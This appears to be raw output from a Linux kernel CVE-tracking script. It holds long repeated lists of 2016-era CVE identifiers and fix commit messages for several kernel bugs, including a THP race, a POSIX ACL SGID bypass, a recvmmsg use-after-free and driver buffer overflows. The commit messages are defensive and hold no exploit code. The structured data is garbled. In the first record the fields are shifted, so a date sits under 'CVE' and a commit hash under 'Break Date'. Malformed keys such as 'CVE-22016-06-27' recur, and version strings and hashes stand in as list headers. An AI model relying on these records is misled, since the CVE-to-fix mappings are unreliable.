CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.8:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.5:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
30a46a4647fd1df9cf52e43bf467f0d9265096ca:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-22016-06-27:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.5:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.5:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
3.15:
CVE-2016-5696:
CVE-2016-5728:
CVE-2016-5828:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
ff19f63ed47309550b47831ac39176d9910fadfe:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
2016-07-08:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
9bf292bfca94694a721449e3fd752493856710f6:
CVE-2016-5828:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
1a1a143daf84db95dd7212086042004a3abb7bc2:
CVE-2016-4997:
CVE-2016-4997:
CVE-2016-4997:
CVE-2016-4998:
CVE-2016-4998:
CVE-2016-4998:
CVE-2016-5195:
CVE-2016-5243:
CVE-2016-5244:
CVE-2016-5400:
CVE-2016-5412:
CVE-2016-5412:
CVE-2016-5696:
CVE-2016-5728:
CVE-2016-5828:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
*************

*** This is a new CVE ***
This CVE has been resolved in 09a2499466dc69d1e54e8e879d4591cdd0ca17c8.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 09a2499466dc69d1e54e8e879d4591cdd0ca17c8
Author: Andrea Arcangeli <aarcange@redhat.com>
Date:   Fri Feb 26 15:19:28 2016 -0800

    mm: thp: fix SMP race condition between THP page fault and MADV_DONTNEED
    
    commit ad33bb04b2a6cee6c1f99fabb15cddbf93ff0433 upstream.
    
    pmd_trans_unstable()/pmd_none_or_trans_huge_or_clear_bad() were
    introduced to locklessy (but atomically) detect when a pmd is a regular
    (stable) pmd or when the pmd is unstable and can infinitely transition
    from pmd_none() and pmd_trans_huge() from under us, while only holding
    the mmap_sem for reading (for writing not).
    
    While holding the mmap_sem only for reading, MADV_DONTNEED can run from
    under us and so before we can assume the pmd to be a regular stable pmd
    we need to compare it against pmd_none() and pmd_trans_huge() in an
    atomic way, with pmd_trans_unstable().  The old pmd_trans_huge() left a
    tiny window for a race.
    
    Useful applications are unlikely to notice the difference as doing
    MADV_DONTNEED concurrently with a page fault would lead to undefined
    behavior.
    
    [js] 3.12 backport: no pmd_devmap in 3.12 yet.
    
    [akpm@linux-foundation.org: tidy up comment grammar/layout]
    Signed-off-by: Andrea Arcangeli <aarcange@redhat.com>
    Reported-by: Kirill A. Shutemov <kirill.shutemov@linux.intel.com>
    Signed-off-by: Andrew Morton <akpm@linux-foundation.org>
    Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>
    Cc: Vlastimil Babka <vbabka@suse.cz>
    Signed-off-by: Jiri Slaby <jslaby@suse.cz>
    Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

 mm/memory.c |   14 ++++++++++++--
 1 file changed, 12 insertions(+), 2 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: -
CVE: 2016-09-11
Break Date: 09a2499466dc69d1e54e8e879d4591cdd0ca17c8
Break Commit: 3.14.79
Break Tag: -
Linus Fix Date: 2016-09-11
Linus Commit: 09a2499466dc69d1e54e8e879d4591cdd0ca17c8
Linus Tag: 3.14.79
Stable Date: -
Stable Commit: 2016-09-11
Stable Tag: 09a2499466dc69d1e54e8e879d4591cdd0ca17c8

CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7042
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: -
Linus Commit: local-2016-7042
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7097:
CVE-2016-7097:
-:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 073931017b49d9458aa351605b43a7e34598caef
Author: Jan Kara <jack@suse.cz>
Date:   Mon Sep 19 17:39:09 2016 +0200

    posix_acl: Clear SGID bit when setting file permissions
    
    When file permissions are modified via chmod(2) and the user is not in
    the owning group or capable of CAP_FSETID, the setgid bit is cleared in
    inode_change_ok().  Setting a POSIX ACL via setxattr(2) sets the file
    permissions as well as the new ACL, but doesn't clear the setgid bit in
    a similar way; this allows to bypass the check in chmod(2).  Fix that.
    
    References: CVE-2016-7097
    Reviewed-by: Christoph Hellwig <hch@lst.de>
    Reviewed-by: Jeff Layton <jlayton@redhat.com>
    Signed-off-by: Jan Kara <jack@suse.cz>
    Signed-off-by: Andreas Gruenbacher <agruenba@redhat.com>

 fs/9p/acl.c               |   40 +++++++++++++++++-----------------------
 fs/btrfs/acl.c            |    6 ++----
 fs/ceph/acl.c             |    6 ++----
 fs/ext2/acl.c             |   12 ++++--------
 fs/ext4/acl.c             |   12 ++++--------
 fs/f2fs/acl.c             |    6 ++----
 fs/gfs2/acl.c             |   12 +++---------
 fs/hfsplus/posix_acl.c    |    4 ++--
 fs/jffs2/acl.c            |    9 ++++-----
 fs/jfs/acl.c              |    6 ++----
 fs/ocfs2/acl.c            |   10 ++++------
 fs/orangefs/acl.c         |   15 +++++----------
 fs/posix_acl.c            |   31 +++++++++++++++++++++++++++++++
 fs/reiserfs/xattr_acl.c   |    8 ++------
 fs/xfs/xfs_acl.c          |   13 ++++---------
 include/linux/posix_acl.h |    1 +
 16 files changed, 89 insertions(+), 102 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7097
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-09-22
Linus Commit: 073931017b49d9458aa351605b43a7e34598caef
Linus Tag: 4.9
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7117:
2.6:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-22016-06-27:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.67.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 34b88a68f26a75e4fded796f1a49c40f82234b7d
Author: Arnaldo Carvalho de Melo <acme@redhat.com>
Date:   Mon Mar 14 09:56:35 2016 -0300

    net: Fix use after free in the recvmmsg exit path
    
    The syzkaller fuzzer hit the following use-after-free:
    
      Call Trace:
       [<ffffffff8175ea0e>] __asan_report_load8_noabort+0x3e/0x40 mm/kasan/report.c:295
       [<ffffffff851cc31a>] __sys_recvmmsg+0x6fa/0x7f0 net/socket.c:2261
       [<     inline     >] SYSC_recvmmsg net/socket.c:2281
       [<ffffffff851cc57f>] SyS_recvmmsg+0x16f/0x180 net/socket.c:2270
       [<ffffffff86332bb6>] entry_SYSCALL_64_fastpath+0x16/0x7a
      arch/x86/entry/entry_64.S:185
    
    And, as Dmitry rightly assessed, that is because we can drop the
    reference and then touch it when the underlying recvmsg calls return
    some packets and then hit an error, which will make recvmmsg to set
    sock->sk->sk_err, oops, fix it.
    
    Reported-and-Tested-by: Dmitry Vyukov <dvyukov@google.com>
    Cc: Alexander Potapenko <glider@google.com>
    Cc: Eric Dumazet <edumazet@google.com>
    Cc: Kostya Serebryany <kcc@google.com>
    Cc: Sasha Levin <sasha.levin@oracle.com>
    Fixes: a2e2725541fa ("net: Introduce recvmmsg socket syscall")
    http://lkml.kernel.org/r/20160122211644.GC2470@redhat.com
    Signed-off-by: Arnaldo Carvalho de Melo <acme@redhat.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 net/socket.c |   38 +++++++++++++++++++-------------------
 1 file changed, 19 insertions(+), 19 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-10
CVE: CVE-2016-7117
Break Date: 2009-10-12
Break Commit: a2e2725541fad72416326798c2d7fa4dafb7d337
Break Tag: 2.6
Linus Fix Date: 2016-03-14
Linus Commit: 34b88a68f26a75e4fded796f1a49c40f82234b7d
Linus Tag: 4.6
Stable Date: 2016-04-20
Stable Commit: 902b916d00ba73095b58a9a8dfe926c6a7f635d5
Stable Tag: 3.14.67

CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 7bc2b55a5c030685b399bb65b6baa9ccc3d1f167
Author: Dan Carpenter <dan.carpenter@oracle.com>
Date:   Thu Sep 15 16:44:56 2016 +0300

    scsi: arcmsr: Buffer overflow in arcmsr_iop_message_xfer()
    
    We need to put an upper bound on "user_len" so the memcpy() doesn't
    overflow.
    
    Cc: <stable@vger.kernel.org>
    Reported-by: Marco Grassi <marco.gra@gmail.com>
    Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com>
    Reviewed-by: Tomas Henzl <thenzl@redhat.com>
    Signed-off-by: Martin K. Petersen <martin.petersen@oracle.com>

 drivers/scsi/arcmsr/arcmsr_hba.c |    8 +++++++-
 1 file changed, 7 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7425
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-09-15
Linus Commit: 7bc2b55a5c030685b399bb65b6baa9ccc3d1f167
Linus Tag: 4.9
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
2012-09-28:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit ded89912156b1a47d940a0c954c43afbabd0c42c
Author: Arend Van Spriel <arend.vanspriel@broadcom.com>
Date:   Mon Sep 5 10:45:47 2016 +0100

    brcmfmac: avoid potential stack overflow in brcmf_cfg80211_start_ap()
    
    User-space can choose to omit NL80211_ATTR_SSID and only provide raw
    IE TLV data. When doing so it can provide SSID IE with length exceeding
    the allowed size. The driver further processes this IE copying it
    into a local variable without checking the length. Hence stack can be
    corrupted and used as exploit.
    
    Cc: stable@vger.kernel.org # v4.7
    Reported-by: Daxing Guo <freener.gdx@gmail.com>
    Reviewed-by: Hante Meuleman <hante.meuleman@broadcom.com>
    Reviewed-by: Pieter-Paul Giesberts <pieter-paul.giesberts@broadcom.com>
    Reviewed-by: Franky Lin <franky.lin@broadcom.com>
    Signed-off-by: Arend van Spriel <arend.vanspriel@broadcom.com>
    Signed-off-by: Kalle Valo <kvalo@codeaurora.org>

 .../broadcom/brcm80211/brcmfmac/cfg80211.c         |    2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-8658
Break Date: 2012-09-28
Break Commit: 1a87334239757b69eb9885979c32bbf871b3ec88
Break Tag: 3.7
Linus Fix Date: 2016-09-07
Linus Commit: ded89912156b1a47d940a0c954c43afbabd0c42c
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit fac8e0f579695a3ecbc4d3cac369139d7f819971
Author: Jesse Gross <jesse@kernel.org>
Date:   Sat Mar 19 09:32:01 2016 -0700

    tunnels: Don't apply GRO to multiple layers of encapsulation.
    
    When drivers express support for TSO of encapsulated packets, they
    only mean that they can do it for one layer of encapsulation.
    Supporting additional levels would mean updating, at a minimum,
    more IP length fields and they are unaware of this.
    
    No encapsulation device expresses support for handling offloaded
    encapsulated packets, so we won't generate these types of frames
    in the transmit path. However, GRO doesn't have a check for
    multiple levels of encapsulation and will attempt to build them.
    
    UDP tunnel GRO actually does prevent this situation but it only
    handles multiple UDP tunnels stacked on top of each other. This
    generalizes that solution to prevent any kind of tunnel stacking
    that would cause problems.
    
    Fixes: bf5a755f ("net-gre-gro: Add GRE support to the GRO stack")
    Signed-off-by: Jesse Gross <jesse@kernel.org>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 include/linux/netdevice.h |    4 ++--
 net/core/dev.c            |    2 +-
 net/ipv4/af_inet.c        |   15 ++++++++++++++-
 net/ipv4/gre_offload.c    |    5 +++++
 net/ipv4/udp_offload.c    |    6 +++---
 net/ipv6/ip6_offload.c    |   15 ++++++++++++++-
 6 files changed, 39 insertions(+), 8 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-8666
Break Date: 2014-01-07
Break Commit: bf5a755f5e9186406bbf50f4087100af5bd68e40
Break Tag: 3.14
Linus Fix Date: 2016-03-20
Linus Commit: fac8e0f579695a3ecbc4d3cac369139d7f819971
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

2016-09-11:
2016-09-11:
2016-09-11:
2016-09-11:
2016-09-11:
2016-09-11:
2016-09-11:
2016-09-11:
CVE-2013-4312:
CVE-2013-7421:
CVE-2013-7421:
CVE-2013-7446:
CVE-2014-0155:
CVE-2014-0181:
CVE-2014-0196:
CVE-2014-0206:
CVE-2014-1737:
CVE-2014-1738:
CVE-2014-1739:
CVE-2014-2580:
CVE-2014-2678:
CVE-2014-2739:
CVE-2014-2851:
CVE-2014-3122:
CVE-2014-3144:
CVE-2014-3145:
CVE-2014-3153:
CVE-2014-3153:
CVE-2014-3153:
CVE-2014-3153:
CVE-2014-3181:
CVE-2014-3182:
CVE-2014-3183:
CVE-2014-3184:
CVE-2014-3185:
CVE-2014-3186:
CVE-2014-3534:
CVE-2014-3601:
CVE-2014-3610:
CVE-2014-3611:
CVE-2014-3631:
CVE-2014-3646:
CVE-2014-3647:
CVE-2014-3647:
CVE-2014-3673:
CVE-2014-3687:
CVE-2014-3688:
CVE-2014-3690:
CVE-2014-3917:
CVE-2014-3940:
CVE-2014-4014:
CVE-2014-4157:
CVE-2014-4171:
CVE-2014-4171:
CVE-2014-4171:
CVE-2014-4508:
CVE-2014-4608:
CVE-2014-4608:
CVE-2014-4611:
CVE-2014-4652:
CVE-2014-4653:
CVE-2014-4654:
CVE-2014-4655:
CVE-2014-4656:
CVE-2014-4656:
CVE-2014-4667:
CVE-2014-4699:
CVE-2014-4943:
CVE-2014-5045:
CVE-2014-5077:
CVE-2014-5206:
CVE-2014-5206:
CVE-2014-5207:
CVE-2014-5207:
CVE-2014-5471:
CVE-2014-5472:
CVE-2014-6410:
CVE-2014-6416:
CVE-2014-6417:
CVE-2014-6418:
CVE-2014-7145:
CVE-2014-7283:
CVE-2014-7284:
CVE-2014-7822:
CVE-2014-7825:
CVE-2014-7826:
CVE-2014-7841:
CVE-2014-7842:
CVE-2014-7843:
CVE-2014-7970:
CVE-2014-7975:
CVE-2014-8086:
CVE-2014-8133:
CVE-2014-8134:
CVE-2014-8159:
CVE-2014-8160:
CVE-2014-8369:
CVE-2014-8480:
CVE-2014-8480:
CVE-2014-8481:
CVE-2014-8559:
CVE-2014-8559:
CVE-2014-8884:
CVE-2014-8989:
CVE-2014-8989:
CVE-2014-8989:
CVE-2014-8989:
CVE-2014-9090:
CVE-2014-9322:
CVE-2014-9322:
CVE-2014-9419:
CVE-2014-9420:
CVE-2014-9428:
CVE-2014-9529:
CVE-2014-9584:
CVE-2014-9585:
CVE-2014-9644:
CVE-2014-9683:
CVE-2014-9710:
CVE-2014-9715:
CVE-2014-9717:
CVE-2014-9728:
CVE-2014-9728:
CVE-2014-9728:
CVE-2014-9729:
CVE-2014-9730:
CVE-2014-9731:
CVE-2014-9803:
CVE-2014-9904:
CVE-2015-0239:
CVE-2015-0272:
CVE-2015-0274:
CVE-2015-0275:
CVE-2015-1328:
CVE-2015-1333:
CVE-2015-1339:
CVE-2015-1420:
CVE-2015-1421:
CVE-2015-1465:
CVE-2015-1573:
CVE-2015-1593:
CVE-2015-1805:
CVE-2015-1805:
CVE-2015-2041:
CVE-2015-2042:
CVE-2015-2150:
CVE-2015-2666:
CVE-2015-2672:
CVE-2015-2686:
CVE-2015-2830:
CVE-2015-2922:
CVE-2015-2925:
CVE-2015-2925:
CVE-2015-3212:
CVE-2015-3288:
CVE-2015-3290:
CVE-2015-3291:
CVE-2015-3331:
CVE-2015-3332:
CVE-2015-3636:
CVE-2015-4001:
CVE-2015-4002:
CVE-2015-4002:
CVE-2015-4003:
CVE-2015-4004:
CVE-2015-4036:
CVE-2015-4167:
CVE-2015-4176:
CVE-2015-4177:
CVE-2015-4178:
CVE-2015-4692:
CVE-2015-4700:
CVE-2015-5156:
CVE-2015-5157:
CVE-2015-5257:
CVE-2015-5283:
CVE-2015-5307:
CVE-2015-5327:
CVE-2015-5364:
CVE-2015-5366:
CVE-2015-5697:
CVE-2015-5706:
CVE-2015-5707:
CVE-2015-5707:
CVE-2015-6252:
CVE-2015-6526:
CVE-2015-6937:
CVE-2015-7312:
CVE-2015-7513:
CVE-2015-7515:
CVE-2015-7550:
CVE-2015-7566:
CVE-2015-7613:
CVE-2015-7799:
CVE-2015-7799:
CVE-2015-7833:
CVE-2015-7833:
CVE-2015-7837:
CVE-2015-7872:
CVE-2015-7884:
CVE-2015-7885:
CVE-2015-7990:
CVE-2015-8019:
CVE-2015-8104:
CVE-2015-8215:
CVE-2015-8374:
CVE-2015-8539:
CVE-2015-8543:
CVE-2015-8550:
CVE-2015-8550:
CVE-2015-8550:
CVE-2015-8550:
CVE-2015-8550:
CVE-2015-8550:
CVE-2015-8550:
CVE-2015-8551:
CVE-2015-8551:
CVE-2015-8551:
CVE-2015-8551:
CVE-2015-8551:
CVE-2015-8552:
CVE-2015-8552:
CVE-2015-8552:
CVE-2015-8552:
CVE-2015-8552:
CVE-2015-8569:
CVE-2015-8575:
CVE-2015-8660:
CVE-2015-8709:
CVE-2015-8746:
CVE-2015-8767:
CVE-2015-8785:
CVE-2015-8787:
CVE-2015-8812:
CVE-2015-8816:
CVE-2015-8830:
CVE-2015-8839:
CVE-2015-8839:
CVE-2015-8839:
CVE-2015-8839:
CVE-2015-8844:
CVE-2015-8845:
CVE-2015-8944:
CVE-2015-8950:
CVE-2015-8952:
CVE-2015-8953:
CVE-2015-8955:
CVE-2015-8956:
CVE-2015-8970:
CVE-2015-8970:
CVE-2015-8970:
CVE-2015-8970:
CVE-2015-8970:
CVE-2015-8970:
CVE-2015-8970:
CVE-2015-8970:
CVE-2015-8970:
CVE-2016-0617:
CVE-2016-0723:
CVE-2016-0728:
CVE-2016-0758:
CVE-2016-0774:
CVE-2016-0821:
CVE-2016-0823:
CVE-2016-1237:
CVE-2016-1237:
CVE-2016-1575:
CVE-2016-1575:
CVE-2016-1576:
CVE-2016-1576:
CVE-2016-1583:
CVE-2016-1583:
CVE-2016-1583:
CVE-2016-2053:
CVE-2016-2069:
CVE-2016-2069:
CVE-2016-2070:
CVE-2016-2085:
CVE-2016-2117:
CVE-2016-2143:
CVE-2016-2184:
CVE-2016-2184:
CVE-2016-2185:
CVE-2016-2186:
CVE-2016-2187:
CVE-2016-2188:
CVE-2016-2383:
CVE-2016-2384:
CVE-2016-2543:
CVE-2016-2544:
CVE-2016-2545:
CVE-2016-2546:
CVE-2016-2547:
CVE-2016-2548:
CVE-2016-2549:
CVE-2016-2550:
CVE-2016-2782:
CVE-2016-2847:
CVE-2016-3070:
CVE-2016-3134:
CVE-2016-3134:
CVE-2016-3134:
CVE-2016-3135:
CVE-2016-3136:
CVE-2016-3137:
CVE-2016-3138:
CVE-2016-3140:
CVE-2016-3156:
CVE-2016-3157:
CVE-2016-3672:
CVE-2016-3689:
CVE-2016-3713:
CVE-2016-3841:
CVE-2016-3857:
CVE-2016-3951:
CVE-2016-3951:
CVE-2016-3955:
CVE-2016-3961:
CVE-2016-4440:
CVE-2016-4470:
CVE-2016-4482:
CVE-2016-4485:
CVE-2016-4486:
CVE-2016-4557:
CVE-2016-4558:
CVE-2016-4565:
CVE-2016-4569:
CVE-2016-4578:
CVE-2016-4578:
CVE-2016-4580:
CVE-2016-4581:
CVE-2016-4794:
CVE-2016-4794:
CVE-2016-4805:
CVE-2016-4913:
CVE-2016-4951:
CVE-2016-4997:
CVE-2016-4997:
CVE-2016-4997:
CVE-2016-4998:
CVE-2016-4998:
CVE-2016-4998:
CVE-2016-5195:
CVE-2016-5243:
CVE-2016-5244:
CVE-2016-5400:
CVE-2016-5412:
CVE-2016-5412:
CVE-2016-5696:
CVE-2016-5728:
CVE-2016-5828:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
2.6:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
54dbc15172375641ef03399e8f911d7165eb90fb:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
-:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
-:
CVE-2016-8658:
CVE-2016-8666:
4.9:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
